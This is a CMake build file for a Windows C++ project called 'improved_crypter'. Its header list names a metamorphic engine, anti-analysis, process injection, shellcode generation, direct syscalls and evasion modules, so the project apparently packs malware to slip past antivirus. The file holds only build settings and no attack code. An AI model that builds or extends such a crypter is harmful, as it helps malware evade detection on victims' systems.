cmake_minimum_required(VERSION 3.10)
project(improved_crypter)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Add Windows-specific definitions
add_definitions(-DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -DNOMINMAX)

# Set warning level
if(MSVC)
    add_compile_options(/W4 /WX- /wd4267 /wd4244)
endif()

# Set output directories
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)

# Add subdirectories for each configuration
foreach(CONFIG ${CMAKE_CONFIGURATION_TYPES})
    string(TOUPPER ${CONFIG} CONFIG_UPPER)
    set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_${CONFIG_UPPER} ${CMAKE_BINARY_DIR}/bin/${CONFIG})
    set(CMAKE_LIBRARY_OUTPUT_DIRECTORY_${CONFIG_UPPER} ${CMAKE_BINARY_DIR}/lib/${CONFIG})
    set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY_${CONFIG_UPPER} ${CMAKE_BINARY_DIR}/lib/${CONFIG})
endforeach()

# Source files
set(SOURCES
    src/main.cpp
)

# Header files
set(HEADERS
    src/crypter.hpp
    src/pe_manipulator.hpp
    src/encryption.hpp
    src/metamorphic_engine.hpp
    src/anti_analysis.hpp
    src/injection_methods.hpp
    src/shellcode_generator.hpp
    src/syscall_utils.hpp
    src/evasion.hpp
    src/resource.h
)

# Create executable
add_executable(improved_crypter ${SOURCES} ${HEADERS})

# Add include directories
target_include_directories(improved_crypter PRIVATE src)

# Link Windows libraries
target_link_libraries(improved_crypter PRIVATE
    comctl32
    bcrypt
    ntdll
    shlwapi
    windowscodecs
    version
    ole32
    comdlg32
    psapi
)

# Copy resources
file(COPY ${CMAKE_SOURCE_DIR}/resources/app.manifest DESTINATION ${CMAKE_BINARY_DIR})
file(COPY ${CMAKE_SOURCE_DIR}/icon.ico DESTINATION ${CMAKE_BINARY_DIR})

# Configure resource file
configure_file(
    ${CMAKE_SOURCE_DIR}/resources/resource.rc.in
    ${CMAKE_BINARY_DIR}/resource.rc
    @ONLY
)

# Add resource file to build
target_sources(improved_crypter PRIVATE ${CMAKE_BINARY_DIR}/resource.rc)
